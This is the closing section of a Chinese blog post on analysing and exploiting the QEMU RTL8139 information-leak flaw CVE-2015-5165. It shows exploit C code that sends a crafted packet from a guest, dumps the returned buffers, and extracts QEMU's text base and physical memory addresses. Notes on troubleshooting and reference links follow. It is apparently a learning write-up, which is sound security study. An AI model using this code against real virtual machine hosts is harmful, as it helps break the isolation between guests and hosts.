class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span> *ptr, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n0x%08x: &quot;</span>, (<span class="keyword">uint32_t</span>)(ptr+i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_text_base_addr</span><span class="params">(rtl8139_ring *ring, <span class="keyword">size_t</span> ring_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_release_bool_offset = <span class="number">0x379DEF</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_get_str = <span class="number">0x379a57</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> offset[<span class="number">2</span>] = &#123;property_get_str, property_release_bool_offset&#125;;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> *ptr = (<span class="keyword">uint8_t</span> *)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span> *end = (<span class="keyword">uint8_t</span> *)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span> *)ptr;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((value &amp; mask) == (offset[j] &amp; mask)) &#123;</span><br><span class="line">                 <span class="keyword">return</span> value - offset[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_physical_addr</span><span class="params">(rtl8139_ring *ring, <span class="keyword">size_t</span> ring_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xffff000000</span>ULL;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="built_in">array</span>[<span class="number">0x10000</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">array</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">array</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> *ptr = (<span class="keyword">uint8_t</span> *)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span> *end = (<span class="keyword">uint8_t</span> *)ring[i].buffer + RTL8139_BUFFER_SIZE/<span class="number">4</span>*<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span> *)ptr;</span><br><span class="line">            <span class="keyword">if</span> (((value &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) &#123;</span><br><span class="line">                value = (value &amp; mask) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">                <span class="built_in">array</span>[value]++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">array</span>[value] &gt; <span class="built_in">array</span>[index]) &#123;</span><br><span class="line">                    index = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> memory_size = <span class="number">0x40000000</span>;</span><br><span class="line">    <span class="keyword">return</span> (((<span class="keyword">uint64_t</span>)index | <span class="number">0x7f0000</span>) &lt;&lt; <span class="number">24</span>) - memory_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44*1500 = 66000 &gt; ip_data_len = 65535</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring *rtl8139_rx_ring;</span><br><span class="line">    rtl8139_desc *rtl8139_rx_desc, *rtl8139_tx_desc;</span><br><span class="line"></span><br><span class="line">    rtl8139_rx_ring = (rtl8139_ring *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb*<span class="keyword">sizeof</span>(rtl8139_ring)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    rtl8139_rx_desc = (rtl8139_desc *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb*<span class="keyword">sizeof</span>(rtl8139_desc)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    rtl8139_tx_desc = (rtl8139_desc *)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(rtl8139_desc)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> *rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, packet, <span class="keyword">sizeof</span>(packet));</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) &#123;</span><br><span class="line">    <span class="comment">// for (int i = 0; i &lt; 2; ++i) &#123;</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span> *)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> text_base_addr = leak_text_base_addr(rtl8139_rx_ring, rtl8139_rx_nb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Text base address: 0x%llx\n&quot;</span>, text_base_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> physical_addr = leak_physical_addr(rtl8139_rx_ring, rtl8139_rx_nb);  <span class="comment">// ERROR</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Physical address: 0x%llx\n&quot;</span>, physical_addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><ol>
<li><code>ifconfig</code>得到的MAC地址是<code>52:54:00:12:34:56</code>，但是<code>rtl8139_do_receive</code>中进行比对时，比对的MAC地址是<code>52:54:00:12:34:57</code>。</li>
<li>与前人的exploit对比得知，函数的偏移有所变化（如<code>property_get_bool</code>），应该是编译的问题。需要自行查看泄露的数据，进行验证。</li>
<li>使用<code>scp</code>命令拷贝到客户机，无法拷贝成功。后使用<code>python3 -m http.server</code>进行文件的传输。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><ol>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/12214746/find-a-commit-on-github-given-the-commit-hash/28053469">git - Find a commit on GitHub given the commit hash - Stack Overflow</a></li>
<li><a target="_blank" rel="noopener" href="https://wiki.osdev.org/RTL8139">RTL8139 - OSDev Wiki</a></li>
<li><a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/zh-hans/%E4%BB%A5%E5%A4%AA%E7%BD%91%E5%B8%A7%E6%A0%BC%E5%BC%8F">以太网帧格式 - 维基百科，自由的百科全书 (wikipedia.org)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/AhuntSun-blog/p/12230694.html">IP 数据报 - AhuntSun - 博客园 (cnblogs.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhshulin/article/details/62888061">一张图了解TCP/IP五层网络模型_在路上-CSDN博客</a></li>
</ol>
<h3 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h3><ol>
<li><a target="_blank" rel="noopener" href="https://programlife.net/2020/06/30/cve-2015-5165-qemu-rtl8139-vulnerability-analysis/#more">QEMU 信息泄露漏洞 CVE-2015-5165 分析及利用 | 程序人生 (programlife.net)</a></li>
<li><a target="_blank" rel="noopener" href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html">.:: Phrack Magazine ::. QEMU Case Study</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Resery/Virtualized_Learning/tree/master/Vulnerability/CVE-2015-5165">Virtualized_Learning/Vulnerability/CVE-2015-5165 at master · Resery/Virtualized_Learning</a></li>
<li><a target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/qemu-pwn-cve-2015-5165%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">qemu-pwn-cve-2015-5165信息泄露漏洞分析 « 纵有寂寂无名时 (ray-cp.github.io)</a></li>
<li><a target="_blank" rel="noopener" href="https://dangokyo.me/2018/03/08/qemu-escape-part-3-information-leakage-cve-2015-5165/">QEMU escape: Part 3 Information Leakage (CVE-2015-5165) – 氷 菓 (dangokyo.me)</a></li>
</ol>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="http://hhdx.xyz">hhdx</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="http://hhdx.xyz/2020/12/05/CVE-2015-5165/">http://hhdx.xyz/2020/12/05/CVE-2015-5165/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/QEMU/">QEMU</a>
            <a href="/tags/CVE/">CVE</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/2020/12/12/CVE-2015-7504/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">QEMU堆溢出漏洞----CVE-2015-7504</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/2020/11/30/babyqemu/">
        <span class="next-text nav-default">HITB GSEC 2017：babyqemu</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"><div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a target="_blank" rel="noopener" href="https://github.com/clxsh" class="iconfont icon-github" title="github"></a>
        <a target="_blank" rel="noopener" href="https://www.douban.com/people/57285004/" class="iconfont icon-douban" title="douban"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2016 - 2020<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">hhdx</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'http://hhdx.xyz/2020/12/05/CVE-2015-5165/';
        this.page.identifier = '2020/12/05/CVE-2015-5165/';
        this.page.title = 'QEMU信息泄露漏洞分析与利用----CVE-2015-5165';
    };
    (function() {
    var d = document, s = d.createElement('script');

    s.src = '//lyliuchao.disqus.com/embed.js';

    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();  
  </script><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
